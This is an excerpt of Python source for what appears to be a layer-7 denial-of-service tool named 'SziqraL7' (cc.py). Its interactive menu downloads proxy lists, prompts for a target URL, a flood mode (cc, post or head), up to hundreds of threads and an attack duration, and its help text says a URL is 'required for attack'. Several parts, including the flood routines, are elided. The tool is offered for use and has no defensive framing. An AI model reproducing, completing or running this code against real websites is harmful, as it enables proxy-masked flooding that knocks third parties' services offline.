...
def print_banner():
	print("\nSziqraL7\nVersion 3.7.1 (2026/6/7)\nhttps://github.com/Sziqra\n")
...
def InputOption(question,options,default):
	...
	while ans == "":
		...
		if ans == "":
			ans = default
		elif options is not None and ans not in options:
...
Example:
  python3 cc.py -url https://example.com -m cc -v 5 -s 30

Notes:
  - -url is required for attack
  - -v = 4 / 5 / http
''')
...
def main():
	...
	if len(sys.argv) == 1:
		while True:
			ShowMenu()
			choice = InputOption("> Choose option [1-4]: ", ["1", "2", "3", "4"], "1")
			if choice == "1":
				PrintHelp()
				continue
			if choice == "2":
				proxy_ver = InputOption("> Proxy type [4/5/http] (default=5): ", ["4", "5", "http"], "5")
				out_file = InputOption("> Proxy file name (default=proxy.txt): ", None, "proxy.txt")
				DownloadProxies(proxy_ver)
				print("> Done. Proxy list saved to " + out_file)
				continue
			if choice == "3":
				url = InputOption("> Target URL: ", None, "")
				if url == "":
					print("> No target URL entered.")
					continue
				ParseUrl(url)
				mode = InputOption("> Mode [cc/post/head] (default=cc): ", ["cc", "post", "head"], "cc")
				proxy_ver = InputOption("> Proxy type [4/5/http] (default=5): ", ["4", "5", "http"], "5")
				thread_num = int(InputOption("> Threads (default=800): ", None, "800"))
				period = int(InputOption("> Duration in seconds (default=60): ", None, "60"))
				if proxy_ver == "4":
					proxy_type = 4
				elif proxy_ver == "5":
					proxy_type = 5
	...
	if os.path.exists(out_file) != True:
		print("> Proxies file not found, downloading a fresh proxy list...")
		try:
			DownloadProxies(proxy_ver)
		except Exception as e:
			print("> Failed to download proxies:", e)
			open(out_file, "a", encoding="utf-8").close()
	if os.path.exists(out_file) != True:
		print("> Proxies file still not available.")
		return
	proxies = open(out_file, "r", encoding="utf-8", errors="ignore").readlines()
	check_list(out_file)
	proxies = open(out_file, "r", encoding="utf-8", errors="ignore").readlines()
	if len(proxies) == 0:
